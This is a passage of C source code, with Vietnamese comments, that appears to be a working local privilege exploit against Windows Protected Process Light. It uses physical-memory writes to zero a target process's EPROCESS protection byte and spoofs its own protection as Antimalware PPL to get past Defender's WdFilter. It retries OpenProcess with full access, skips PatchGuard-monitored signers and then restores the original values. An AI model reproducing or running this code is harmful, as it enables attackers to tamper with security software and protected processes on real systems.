                if (va_to_pa(sys_ep.cr3, KUSD_VA, &kusd_pa)) {
                    uint32_t ntmaj = 0;
                    phys_read(kusd_pa + 0x26C, &ntmaj, 4);
                    cr3_valid = (ntmaj == 10);
                    printf("    KUSD NtMajorVersion=%u  %s\n\n", ntmaj,
                           cr3_valid ? "[CR3 VALID]" : "[CR3 WRONG]");
                } else {
                    printf("    Both checks FAIL — CR3 unusable, falling back to phys scan\n\n");
                }
            }
        } else {
            printf("    SHI lookup failed (low priv?) — fallback to phys scan\n\n");
        }

        if (cr3_valid) {
            printf("[5] Getting authoritative target EPROCESS via SHI...\n");
            tgt_eproc_va = get_eproc_va_by_pid(target_pid);
            if (tgt_eproc_va)
                printf("    EPROCESS VA = 0x%016llX\n\n",
                       (unsigned long long)tgt_eproc_va);
        }
    }

    /* ── Thu thập TẤT CẢ physical copies của target EPROCESS ────────────────
     * Scan tìm mọi EPROCESS có đúng PID trong physical memory.
     * Có thể có 1 live copy + N stale copies từ lần chạy trước cùng PID.
     * Thử từng cái — cái nào làm OpenProcess thành công là live copy.
     * ────────────────────────────────────────────────────────────────────── */
#define MAX_CANDS 16
    EprocEntry cands[MAX_CANDS];
    int n_cands = 0;

    /* Nếu có CR3 valid → ưu tiên authoritative PA từ SHI */
    if (cr3_valid && tgt_eproc_va) {
        uint64_t auth_pa = 0;
        if (va_to_pa(sys_ep.cr3, tgt_eproc_va, &auth_pa) && auth_pa) {
            uint8_t prot = 0;
            phys_read(auth_pa + OFF_PROT, &prot, 1);
            cands[0].pa  = auth_pa;
            cands[0].pid = target_pid;
            cands[0].prot = prot;
            strncpy(cands[0].name, target_name, 15);
            cands[0].name[15] = 0;
            n_cands = 1;
            printf("    [SHI] Authoritative PA = 0x%016llX  prot=0x%02X\n\n",
                   (unsigned long long)auth_pa, prot);
        }
    }

    /* List walk (nếu CR3 valid) */
    if (cr3_valid && n_cands == 0) {
        EprocEntry walk_buf[8] = {0};
        int nw = walk_eprocess_list(sys_ep.cr3, sys_ep.flink,
                                    target_pid, walk_buf, 8);
        for (int i = 0; i < nw && n_cands < MAX_CANDS; i++) {
            if (walk_buf[i].pid != target_pid) continue;
            /* Dedup by PA */
            int dup = 0;
            for (int j=0; j<n_cands; j++)
                if (cands[j].pa == walk_buf[i].pa) { dup=1; break; }
            if (!dup) cands[n_cands++] = walk_buf[i];
        }
    }

    /* Physical scan — luôn chạy để tìm target + self EPROCESS trong 1 pass */
    printf("[5] Physical scan for '%s' and self EPROCESS...\n", target_name);
    uint32_t my_pid = GetCurrentProcessId();
    EprocEntry self_ep = {0};
    {
        EprocEntry scan_buf[MAX_CANDS] = {0};
        int ns = scan_eprocess(target_pid, my_pid, scan_buf, MAX_CANDS);
        for (int i = 0; i < ns; i++) {
            if (scan_buf[i].pid == my_pid && !self_ep.pa) {
                self_ep = scan_buf[i];
                printf("    [self] PA=0x%016llX  prot=0x%02X\n",
                       (unsigned long long)self_ep.pa, self_ep.prot);
                continue;
            }
            if (scan_buf[i].pid != target_pid) continue;
            if (_stricmp(scan_buf[i].name, target_name) != 0) continue;
            int dup = 0;
            for (int j=0; j<n_cands; j++)
                if (cands[j].pa == scan_buf[i].pa) { dup=1; break; }
            if (!dup && n_cands < MAX_CANDS) cands[n_cands++] = scan_buf[i];
        }
    }

    if (n_cands == 0) {
        printf("[-] No EPROCESS found for '%s'\n", target_name);
        CloseHandle(g_dev); return 1;
    }

    printf("\n[5] EPROCESS candidates found: %d\n", n_cands);
    for (int i = 0; i < n_cands; i++) {
        printf("    [%d] PA=0x%016llX  prot=",
               i, (unsigned long long)cands[i].pa);
        prot_print(cands[i].prot);
        printf("\n");
    }

    /* Nếu tất cả đã là prot=0 thì không cần làm gì */
    {
        int need = 0;
        for (int i=0; i<n_cands; i++) if (cands[i].prot != 0) { need=1; break; }
        if (!need) {
            printf("\n[!] All candidates have Protection=0x00 already\n");
            CloseHandle(g_dev); return 0;
        }
    }

    printf("\n    --> Nhan Enter de proceed, Ctrl+C de abort: ");
    fflush(stdout);
    getchar();
    printf("\n");

    /* ── DIAGNOSTIC: phys vs kernel view ───────────────────────────────────
     * NtQueryInformationProcess(class 61) đọc EPROCESS.Protection qua kernel VA.
     * So sánh với phys_read:
     *   phys=0x00, kernel=original → STALE PA — write tới copy sai
     *   phys=0x00, kernel=0x00     → LIVE PA đã patch — ObCallback block
     *   phys=original              → phys_write silently fail
     *
     * SAFETY: KHÔNG write vào WinTcb (signer>=6) hoặc PP (type>=2) — PatchGuard
     * và SecureKernel monitor những process này và BSOD ngay khi Protection thay đổi.
     * ─────────────────────────────────────────────────────────────────────── */
    {
        typedef NTSTATUS (NTAPI *PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        PFN_NTQIP NtQIP = (PFN_NTQIP)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        HANDLE hQLP = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);

        EprocEntry *d = NULL;
        for (int i=0; i<n_cands; i++) if (cands[i].prot != 0) { d=&cands[i]; break; }

        uint8_t signer = (d->prot >> 4) & 0xF;
        uint8_t type   = d->prot & 0x7;

        /* WinTcb=6, WinSystem=7, Lsa=4, Windows=5 → PatchGuard/SecureKernel protected */
        int safe_to_write = (signer <= 3 && type == 1);

        printf("[6] Diagnostic (PA=0x%016llX  signer=%u  type=%u)...\n",
               (unsigned long long)d->pa, signer, type);

        /* NtQIP BEFORE write — baseline */
        UCHAR v_before = 0xFF;
        if (hQLP && NtQIP) NtQIP(hQLP, 61, &v_before, 1, NULL);
        printf("    NtQIP BEFORE write  = 0x%02X\n", v_before);

        if (!safe_to_write) {
            printf("    [!] Signer=%u (WinTcb/WinSystem/Lsa/Windows) — SKIP write\n", signer);
            printf("        Modifying Protection for this signer triggers PatchGuard BSOD.\n\n");
            if (hQLP) CloseHandle(hQLP);
            goto skip_patch_loop;
        }

        {
            uint8_t zero = 0, v_phys = 0;
            UCHAR   v_after = 0xFF;

            phys_write(d->pa + OFF_PROT, &zero, 1);
            phys_read(d->pa + OFF_PROT, &v_phys, 1);
            if (hQLP && NtQIP) NtQIP(hQLP, 61, &v_after, 1, NULL);

            printf("    phys_read  (UC)     = 0x%02X\n", v_phys);
            printf("    NtQIP AFTER write   = 0x%02X\n", v_after);

            if (v_phys == 0x00 && v_after != 0x00) {
                printf("\n    DIAGNOSIS: STALE PA — phys write không ảnh hưởng live EPROCESS.\n");
                printf("               Cần fix va_to_pa để lấy đúng PA.\n\n");
            } else if (v_phys == 0x00 && v_after == 0x00) {
                printf("\n    DIAGNOSIS: LIVE PA đã patch — kernel thấy 0x00.\n");
                printf("               OpenProcess bị block bởi ObCallback.\n\n");
            } else {
                printf("\n    DIAGNOSIS: phys_write silently fail (MmMapIoSpace NULL).\n\n");
            }

            Sleep(200);
            UCHAR v_k2 = 0xFF;
            if (hQLP && NtQIP) NtQIP(hQLP, 61, &v_k2, 1, NULL);
            if (v_after == 0x00 && v_k2 != 0x00)
                printf("    t=200ms NtQIP=0x%02X  ← AV RESTORE detected\n", v_k2);

            phys_write(d->pa + OFF_PROT, &d->prot, 1);
        }
        if (hQLP) CloseHandle(hQLP);
        printf("\n");
    }

    /* ── PATCH LOOP: thử từng candidate ──────────────────────────────────── */
    /* Strategy:
     *   1. Clear target Protection → bypass kernel PspCheckForInvalidAccessByProtectedProcess
     *   2. Elevate SELF Protection = 0x31 → WdFilter sees caller as PPL-Antimalware → allow
     * Both writes go via UC (MmNonCached) → kernel WB cache invalidated → visible immediately.
     */
    printf("[7] Patching (target clear + self-elevate to 0x31)...\n");
    if (self_ep.pa)
        printf("    Self EPROCESS PA=0x%016llX will be elevated to 0x31\n\n",
               (unsigned long long)self_ep.pa);
    else
        printf("    [!] Self EPROCESS not found — WdFilter bypass may still fail\n\n");

    uint8_t zero = 0;
    uint8_t fake_prot = 0x31;   /* Antimalware/PPL — same level as MsMpEng */
    HANDLE hProc = NULL;
    int winner = -1;

    for (int ci = 0; ci < n_cands && !hProc; ci++) {
        EprocEntry *c = &cands[ci];
        if (c->prot == 0) continue;
        uint8_t sg = (c->prot >> 4) & 0xF, tp = c->prot & 0x7;
        if (sg > 3 || tp > 1) {
            printf("    [%d] SKIP signer=%u — PatchGuard protected\n", ci, sg);
            continue;
        }
        printf("    [%d] PA=0x%016llX...\n", ci, (unsigned long long)c->pa);

        for (int attempt = 1; attempt <= 200; attempt++) {
            /* Step A: clear target Protection */
            phys_write(c->pa + OFF_PROT, &zero, 1);
            /* Step B: elevate self to PPL-Antimalware so WdFilter trusts us */
            if (self_ep.pa) phys_write(self_ep.pa + OFF_PROT, &fake_prot, 1);

            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

            /* Restore self immediately regardless of outcome */
            if (self_ep.pa) phys_write(self_ep.pa + OFF_PROT, &self_ep.prot, 1);

            if (hProc) {
                printf("        SUCCESS at attempt #%d\n\n", attempt);
                winner = ci;
                break;
            }
            if (attempt % 50 == 0)
                printf("        [%3d] ...\n", attempt);
        }

        if (!hProc) {
            phys_write(c->pa + OFF_PROT, &c->prot, 1);
            printf("        [-] Failed — restoring\n");
        }
    }

skip_patch_loop:
    if (!hProc) {
        printf("\n[-] All candidate(s) failed\n");
        CloseHandle(g_dev); return 1;
    }
    printf("    [+] SUCCESS! Handle = 0x%p  (candidate %d)\n\n",
           (void*)hProc, winner);

    /* Show process info */
    char img_path[MAX_PATH] = {0};
    DWORD path_sz = sizeof(img_path);
    if (QueryFullProcessImageNameA(hProc, 0, img_path, &path_sz))
        printf("    Path: %s\n\n", img_path);

    /* ── RESTORE ngay lập tức ────────────────────────────────────────────── */
    CloseHandle(hProc);
    EprocEntry *w = &cands[winner];
    printf("[8] Restoring Protection → 0x%02X (PA=0x%016llX)...\n",
           w->prot, (unsigned long long)w->pa);
    if (phys_write(w->pa + OFF_PROT, &w->prot, 1))
        printf("    [+] Restored\n");
    else
        printf("    [-] Restore failed!\n");

    /* Verify restore */
    uint8_t verify_prot = 0;
    phys_read(w->pa + OFF_PROT, &verify_prot, 1);
    printf("    Readback = 0x%02X  %s\n",
           verify_prot, verify_prot == w->prot ? "[OK]" : "[MISMATCH]");

    CloseHandle(g_dev);
    printf("\nDone. PPL bypass confirmed — process handle obtained and Protection restored.\n");
    return 0;
}
